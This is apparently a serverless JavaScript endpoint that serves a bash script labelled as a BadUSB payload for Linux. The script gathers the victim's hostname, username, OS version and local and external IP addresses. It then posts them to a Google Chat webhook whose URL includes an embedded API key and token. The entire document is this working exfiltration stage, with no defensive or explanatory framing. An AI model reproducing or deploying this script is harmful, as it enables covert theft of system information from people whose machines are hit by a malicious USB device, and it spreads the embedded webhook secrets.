export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.status(200).send(`
#!/bin/bash
pc=$(hostname)
u=$(whoami)
if [ -f /etc/os-release ]; then
    . /etc/os-release
    os="$NAME $VERSION"
else
    os="Unknown Linux"
fi
li=$(hostname -I | awk '{print $1}')
ei=$(curl -s --max-time 2 https://api.ipify.org)
[ -z "$ei" ] && ei="N/A"
json="{\\"text\\":\\"[BADUSB [LINUX]]\\\\nPC: $pc\\\\nUser: $u\\\\nOS: $os\\\\nLocal IP: $li\\\\nExternal IP: $ei\\"}"
curl -s -X POST -H "Content-Type: application/json" -d "$json" 'https://chat.googleapis.com/v1/spaces/AAQAWgAQwQA/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=fXfm69VAuOUNAmgGVTI-k19PPWCJcxgkLRl4jw2tTl4'
  `.trim());
}
